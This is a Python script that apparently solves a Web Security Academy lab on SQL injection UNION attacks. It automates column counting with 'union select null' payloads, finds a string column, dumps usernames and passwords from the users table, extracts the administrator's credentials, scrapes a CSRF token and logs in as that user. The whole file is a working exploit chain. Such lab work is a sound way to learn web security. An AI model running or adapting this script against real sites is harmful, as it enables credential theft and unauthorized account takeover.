import requests
import json
import urllib
from bs4 import BeautifulSoup

# 4 Final lab for union attack - SQL injection UNION attack, retrieving multiple values in a single column
# combine all scripts:
# (i) detect columns
# (ii) detect column with string value type
# (iii) exploit to get password
# (iv) login 

#modify here ---------
baseURL = "https://0a55006d0449e6e0c0d952ad003400ff.web-security-academy.net"
cookies = {'session':'RI5oTPe4rzjqSEOmz8S5fBFKDUWPv4jE'}
#modify end ----------

exploitURL = baseURL + "/filter?category="
loginURL = baseURL + "/login"
username = ""
password = "" 
csrf_token = ""

found = False;
col_index = 0  # counter for no. of columns

#--(i) detect columns--------------------------------------------------
print("Detecting no of columns with union attack...")

while(found == False):
	payload = "' union select {}null--".format(col_index*'null,')
	res = requests.get(exploitURL+payload)
	if (res.status_code == 200):
		found = True
		break
	else:
		col_index=col_index+1

col_count = col_index+1
print(" [+] Found! Total columns detected = {}\n".format(col_count))


#--(ii) detect column with string value type-------------------------------
print("2 Detecting column with text")
found = False
# colText = 0 # counter for which column is string type

# Make the database retrieve the string: 'fk6EB0'
for index in range(col_count):
	array = ['null'] * col_count
	array[index] = "'text'"
	stringWithComma = ",".join(array) 
	payload = "' union select {}--".format(stringWithComma)

	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	res = requests.get(url = exploitURL+payload)
	if res.status_code == 200:	
		print(" [+] Found! column index {} is a string type\n".format(index))
		colText = index
		break

#---# (iii) exploit to get password-------------------------------------------

# ' union select null,username||'~'||password from users--
print("3 Retrieve data from users table")

array = ['null'] * col_count
array[colText] = "username||'~'||password"
stringWithComma = ",".join(array)
payload = "' union select {} from users--".format(stringWithComma)
html_content = requests.get(exploitURL+payload).text
soup = BeautifulSoup(html_content,"html.parser")

table = soup.find('table', class_='is-table-list')
print("Searching for 'administrator' ...")
for row in table.tbody.find_all('tr'):
		headers = str(row.find_all('th'))
		if 'administrator' in headers:
			print("[+] Found username and password!")
			userpass = row.find('th').text.strip()
			username = userpass.split("~")[0]
			password = userpass.split("~")[1]

print(" [+] username: {}".format(username))
print(" [+] password: {}".format(password))

#https://0aea00b004101da9c0db297000910086.web-security-academy.net/login
   # <section>
   #      <form class=login-form method=POST action=/login>
   #          <input required type="hidden" name="csrf" value="..................">
   #          <label>Username</label>

print("\nAttempt to login with credentials...")
print("finding csrf token... ")
html_content = requests.get(url = loginURL, cookies=cookies).text
soup = BeautifulSoup(html_content, "html.parser")
csrf_token = soup.find('input', {'name':'csrf'})['value']
print(" [+] csrf token found! : {}".format(csrf_token))

print("\n4 Loggin in... ")

# data body
# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
data = "csrf={}&username={}&password={}".format(csrf_token,username,password)

res = requests.post(url = loginURL, data = data, cookies=cookies)

#if login is successful you will see 'Log out' 
if "Log out" in res.text:
	print(" [+] Found 'Log out' string in response! Successfully logged in!")